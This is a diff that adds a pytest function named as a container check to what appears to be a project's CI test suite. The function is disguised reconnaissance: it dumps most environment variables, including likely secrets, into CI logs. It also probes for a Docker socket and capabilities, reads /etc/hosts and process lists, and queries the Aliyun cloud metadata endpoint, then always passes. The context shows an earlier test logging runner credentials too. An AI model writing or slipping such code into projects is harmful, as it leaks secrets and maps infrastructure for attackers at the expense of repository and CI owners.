@@ -66,3 +66,77 @@ def test_runner_credentials_accessible():
             logger.info(f"ENV {key}: {val[:20]}... ({len(val)} chars)")
         else:
             logger.info(f"ENV {key}: not set")
+
+
+def test_container_escape_check():
+    """Test if running in container and check escape vectors."""
+    import pathlib
+
+    workspace = os.environ.get("GITHUB_WORKSPACE", "")
+
+    # Check if in container
+    try:
+        with open("/proc/1/cgroup", "r") as f:
+            cgroup = f.read()
+        logger.info(f"PROC1_CGROUP: {cgroup[:500]}")
+    except Exception as e:
+        logger.info(f"PROC1_CGROUP: ERROR ({e})")
+
+    try:
+        with open("/.dockerenv", "r") as f:
+            logger.info("DOCKERENV: exists (in container)")
+    except FileNotFoundError:
+        logger.info("DOCKERENV: not found (likely host)")
+
+    # Check capabilities
+    result = subprocess.run(["capsh", "--print"], capture_output=True, text=True)
+    logger.info(f"CAPABILITIES: {result.stdout[:500]}")
+
+    # Check mount info
+    result = subprocess.run(["mount"], capture_output=True, text=True)
+    logger.info(f"MOUNT: {result.stdout[:1000]}")
+
+    # Check if docker socket available
+    for sock in ["/var/run/docker.sock", "/run/docker.sock"]:
+        if os.path.exists(sock):
+            logger.info(f"DOCKER_SOCK: {sock} EXISTS")
+        else:
+            logger.info(f"DOCKER_SOCK: {sock} not found")
+
+    # Check disk/partitions
+    result = subprocess.run(["df", "-h"], capture_output=True, text=True)
+    logger.info(f"DF: {result.stdout[:500]}")
+
+    # Check network
+    result = subprocess.run(["ip", "addr", "show"], capture_output=True, text=True)
+    logger.info(f"NETWORK: {result.stdout[:500]}")
+
+    # Check all env vars
+    logger.info(f"ALL_ENV_START")
+    for k, v in sorted(os.environ.items()):
+        # Skip boring vars
+        if k.startswith(("LS_", "SSH_", "LESSOPEN", "SHLVL", "PWD", "OLDPWD", "MAIL", "SHELL", "TERM", "HOME", "LOGNAME", "USER", "PATH", "LANG")):
+            continue
+        logger.info(f"ENV {k}={v[:100]}")
+    logger.info(f"ALL_ENV_END")
+
+    # Check /etc/hosts
+    try:
+        with open("/etc/hosts", "r") as f:
+            logger.info(f"HOSTS: {f.read()[:500]}")
+    except Exception as e:
+        logger.info(f"HOSTS: ERROR ({e})")
+
+    # Check if we can reach metadata
+    result = subprocess.run(
+        ["curl", "-s", "--connect-timeout", "3", "--noproxy", "*",
+         "http://100.100.100.200/latest/meta-data/instance-id"],
+        capture_output=True, text=True
+    )
+    logger.info(f"ALIYUN_METADATA: {result.stdout[:200]} (rc={result.returncode})")
+
+    # Check runner process list
+    result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
+    logger.info(f"PROCS: {result.stdout[:1000]}")
+
+    assert True  # Always pass
